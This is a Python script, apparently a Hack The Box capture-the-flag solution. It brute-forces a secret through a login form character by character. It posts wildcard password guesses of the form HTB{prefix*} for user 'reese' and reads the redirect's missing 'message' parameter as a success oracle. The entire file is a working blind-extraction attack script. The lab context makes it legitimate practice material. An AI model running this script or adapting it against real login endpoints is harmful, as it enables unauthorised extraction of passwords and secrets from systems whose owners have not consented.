import os
import sys
import string
from urllib.request import Request, urlopen
from urllib.parse import parse_qs, urlparse, urlencode

url = sys.argv[1] if len(sys.argv) > 1 else False
if not url: sys.exit(f'Please specify a URL: {sys.argv[0]} <URL>')
letters = string.ascii_letters + string.digits + '_'
found = ''

try:
    while True:
        for l in letters:
            data = urlencode({
                'username': 'reese',
                'password': f'HTB{{{found}{l}*}}',
            }).encode()
            req = Request(url, data=data)
            resp = urlopen(req)
            if not parse_qs(urlparse(resp.geturl()).query).get('message'):
                print('\b' * len(found), end='', flush=True)
                found += l
                print(found, end='', flush=True)
except KeyboardInterrupt:
    print('\nd0n3 h4ck1ng!')
    print(f'HTB{{{found}}}')


